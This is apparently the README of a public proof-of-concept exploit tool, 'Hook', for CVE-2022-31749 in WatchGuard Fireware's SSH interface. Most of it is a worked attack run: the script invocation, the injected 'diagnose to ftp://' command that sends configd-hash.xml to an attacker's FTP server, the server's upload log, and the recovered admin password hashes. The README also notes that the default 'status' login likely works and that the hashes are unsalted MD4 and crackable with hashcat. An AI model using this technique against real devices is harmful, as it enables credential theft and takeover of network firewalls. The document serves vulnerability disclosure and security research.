# Hook

Hook exploits a parameter injection vulnerability in the WatchGuard SSH interface. The vulnerability allows a low privileged user to exfiltrate arbitrary system files to an attacker controlled FTP server. Fortunately, there is a builtin low privileged user named `status` that this script defaults to. It isn't unreasonable to assume that the `status` user will use a password of `readonly`, but it isn't required.

Hook exfiltrates the user file `configd-hash.xml`. This file contains hashed user passwords. The hashes are simply unsalted MD4. `funoverip` [described](https://web.archive.org/web/20160522043540/http://funoverip.net/2013/09/cracking-watchguard-passwords/) using hashcat to crack the hashes in this file all the way back in 2013.

## Example Usage

```
albinolobster@ubuntu:~/hook$ python3 hook.py --lhost 10.12.70.251 --rhost 10.12.70.249
   0101010001101000 0110010100100000 0110100001101111
   0110111101101011 0010000001100010 0111001001101001
    ,ggg,        gg                                     
   dP""Y8b       88                           ,dPYb,    
   Yb, `88       88                           IP'`Yb    
    `"  88       88                           I8  8I   
        88aaaaaaa88                           I8  8bgg, 
        88"""""""88    ,ggggg,     ,ggggg,    I8 dP" "8 
        88       88   dP"  "Y8ggg dP"  "Y8ggg I8d8bggP" 
        88       88  i8'    ,8I  i8'    ,8I   I8P' "Yb, 
        88       Y8,,d8,   ,d8' ,d8,   ,d8'  ,d8    `Yb,
        88       `Y8P"Y8888P"   P"Y8888P"    88P      Y8
   0110111001100111 0111001100100000 0111100101101111
   0111010100100000 0110001001100001 0110001101101011

                       jbaines-r7                    
                     CVE-2022-31749                  
                           🦞                        

[+] Spinning up FTP server thread
[I 2022-06-16 12:58:39] concurrency model: async
[I 2022-06-16 12:58:39] masquerade (NAT) address: None
[I 2022-06-16 12:58:39] passive ports: None
[I 2022-06-16 12:58:39] >>> starting FTP server on 10.12.70.251:1270, pid=19473 <<<
diagnose to ftp://r7:1270/r7
--
-- WatchGuard Fireware OS Version 12.1.3.B658867
-- Support: https://www.watchguard.com/support/supportLogin.asp
-- Copyright (C) 1996-2022 WatchGuard Technologies Inc.
--
WG>diagnose to ftp://r7:1270/r7
Name: 
albinolobster
Password: 
[I 2022-06-16 12:58:46] 10.12.70.249:52588-[] FTP session opened (connect)
[I 2022-06-16 12:58:46] 10.12.70.249:52588-[albinolobster] USER 'albinolobster' logged in.
[I 2022-06-16 12:58:46] 10.12.70.249:52588-[albinolobster] STOR /home/albinolobster/hook/configd-hash.xml completed=1 bytes=249 seconds=0.001
[I 2022-06-16 12:58:46] 10.12.70.249:52588-[albinolobster] FTP session closed (disconnect).

WG>
[!] Done
albinolobster@ubuntu:~/hook$ file configd-hash.xml 
configd-hash.xml: gzip compressed data, max speed, from Unix, original size modulo 2^32 587
albinolobster@ubuntu:~/hook$ mv configd-hash.xml configd-hash.xml.gz
albinolobster@ubuntu:~/hook$ gunzip configd-hash.xml.gz 
albinolobster@ubuntu:~/hook$ cat configd-hash.xml 
<?xml version="1.0"?>
<users>
  <version>3</version>
  <user name="admin">
    <enabled>1</enabled>
    <hash>628427e87df42adc7e75d2dd5c14b170</hash>
    <domain>Firebox-DB</domain>
    <role>Device Administrator</role>
  </user>
  <user name="status">
    <enabled>1</enabled>
    <hash>dddbcb37e837fea2d4c321ca8105ec48</hash>
    <domain>Firebox-DB</domain>
    <role>Device Monitor</role>
  </user>
  <user name="wg-support">
    <enabled>0</enabled>
    <hash>dddbcb37e837fea2d4c321ca8105ec48</hash>
    <domain>Firebox-DB</domain>
    <role>Device Monitor</role>
  </user>
</users>
albinolobster@ubuntu:~/hook$ 
```

## Credit

* [Blues Traveler](https://www.youtube.com/watch?v=pdz5kCaCRFM)
